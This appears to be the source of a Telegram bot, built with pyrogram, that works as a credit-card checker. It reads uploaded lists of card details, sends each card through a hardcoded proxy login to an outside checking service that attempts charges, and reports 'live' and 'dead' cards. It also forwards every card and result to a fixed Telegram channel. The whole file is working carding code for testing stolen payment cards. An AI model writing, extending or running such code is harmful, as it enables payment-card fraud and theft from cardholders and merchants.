from pyrogram import Client, filters
import requests
import json
from EQUROBOT import app

channel_id = '-1002196680748'  # Replace with your channel ID

# Helper function to divide the amount by 100
def divide_by_100(amount):
    return amount / 100 if amount else 0

# Command handler for document
@app.on_message(filters.document)
async def handle_document(client, message):
    # Ensure the file is a .txt file
    if not message.document.file_name.endswith('.txt'):
        await message.reply_text("Please upload a .txt file containing card details.")
        return

    # Download the file
    file_path = await message.download()

    # Process the file
    with open(file_path, 'r') as file:
        card_lines = file.readlines()

    total_cards = len(card_lines)
    checked_cards = 0
    live_cards = 0
    dead_cards = 0
    user_counts = {'ok_cc_count': 0, 'declined_cc_count': 0, 'charged_cc_count': 0, 'checked_cc_count': 0, 'total_cc_count': total_cards}
    session_results = {}

    for card_details in card_lines:
        card_details = card_details.strip()
        if not card_details:
            continue

        # API endpoint and parameters
        url = "https://freechecker.hrk.dev/checker"
        params = {
            'cc': card_details,
            'proxy': "50.3.137.177:12345:tickets:proxyon145"  # Replace with your proxy if needed
        }

        # Make the API request
        response = requests.get(url, params=params)
        try:
            response_json = response.json()
        except json.JSONDecodeError:
            last_card_response = f"Failed to decode response for {card_details}.\nResponse text: {response.text}"
            dead_cards += 1
            user_counts['declined_cc_count'] += 1
            session_results[message.id] = f"Declined ❌: {card_details}"

            update_msg = (f"{last_card_response}\n"
                          f"𝐂𝐡𝐚𝐫𝐠𝐞𝐝 𝐂𝐂𝐬: {user_counts['charged_cc_count']}\n"
                          f"𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 𝐂𝐂𝐬: {user_counts['ok_cc_count']}\n"
                          f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 𝐂𝐂𝐬: {user_counts['declined_cc_count']}\n"
                          f"𝐓𝐨𝐭𝐚𝐥 𝐂𝐂𝐬: {user_counts['checked_cc_count']}/{user_counts['total_cc_count']}\n")
            await message.reply_text(update_msg)
            continue

        # Process the response
        payment_info = response_json.get('payment', {})
        status = payment_info.get('status', 'failed')
        amount = payment_info.get('amount', 0)
        divided_amount = divide_by_100(amount)
        currency = payment_info.get('currency', 'UNKNOWN')
        message_info = payment_info.get('message', {})
        decline_reason = message_info.get('failed_reason_message', 'UNKNOWN')
        intent = message_info.get('intent', 'UNKNOWN')
        text = message_info.get('text', 'UNKNOWN')

        if status == 'succeeded':
            live_cards += 1
            success_message = (f"┏━━━━━━━⍟\n"
                               f"┃ CHARGE {divided_amount} {currency} ✅\n"
                               f"┗━━━━━━━━━━━⊛\n"
                               f"➩ CARD: `{card_details}`\n"
                               f"➩ RESPONSE: *Payment Successful!✅*\n"
                               f"➩ PAYMENT INTENT ID: `{intent}`\n"
                               f"➩ AMOUNT: `{divided_amount}` `{currency}`\n\n")

            await message.reply_text(success_message)
            await client.send_message(channel_id, success_message)
            user_counts['charged_cc_count'] += 1
            session_results[message.id] = f"Charged ✅: {card_details}"
        else:
            dead_cards += 1
            failed_message = (f"┏━━━━━━━⍟\n"
                              f"┃ #DEAD ❌\n"
                              f"┗━━━━━━━━━━━⊛\n"
                              f"➩ CARD: `{card_details}`\n"
                              f"➩ RESPONSE: CVV DECLINE ❌\n"
                              f"➩ REASON: `{decline_reason}`\n"
                              f"➩ MESSAGE: `{text}`\n\n")

            await message.reply_text(failed_message)
            await client.send_message(channel_id, failed_message)
            user_counts['declined_cc_count'] += 1
            session_results[message.id] = f"Declined ❌: {card_details}"

        checked_cards += 1
        user_counts['checked_cc_count'] = checked_cards

        update_msg = (f"𝐂𝐡𝐚𝐫𝐠𝐞𝐝 𝐂𝐂𝐬: {user_counts['charged_cc_count']}\n"
                      f"𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 𝐂𝐂𝐬: {user_counts['ok_cc_count']}\n"
                      f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 𝐂𝐂𝐬: {user_counts['declined_cc_count']}\n"
                      f"𝐓𝐨𝐭𝐚𝐥 𝐂𝐂𝐬: {user_counts['checked_cc_count']}/{user_counts['total_cc_count']}\n")
        await message.reply_text(update_msg)

    # Summary of the processed cards
    summary_text = (f"┏━━━━━━━⍟\n"
                    f"┃ Total Cards Checked: {checked_cards}\n"
                    f"┃ Live Cards: {live_cards}\n"
                    f"┃ Dead Cards: {dead_cards}\n"
                    f"┗━━━━━━━━━━━⊛")
    await message.reply_text(summary_text)
